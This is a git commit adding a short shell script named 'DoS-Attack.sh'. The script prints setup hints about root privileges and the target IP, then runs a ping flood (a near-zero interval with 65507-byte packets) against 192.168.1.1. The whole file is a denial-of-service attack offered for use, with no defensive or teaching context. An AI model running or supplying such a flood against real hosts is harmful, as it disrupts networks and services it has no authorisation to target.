1f9a1b9d04f233b74a48c9f2c5f3b8c17c5af796
Hyperninja303 <62408125+Hyperninja303@users.noreply.github.com>
2021-08-07 20:21:23 -0700

    Added main DoS file.

---
+++ DoS-Attack.sh
@@ -0,0 +1,3 @@
+echo if You get an eror, please make sure you are in the Denial of Service Directory and have root privliges. 
+echo also remember to configure the IP address and also configure the data size and interval speed if any problems occur.
+sudo ping -i 0.000000000000001 -s 65507 192.168.1.1 
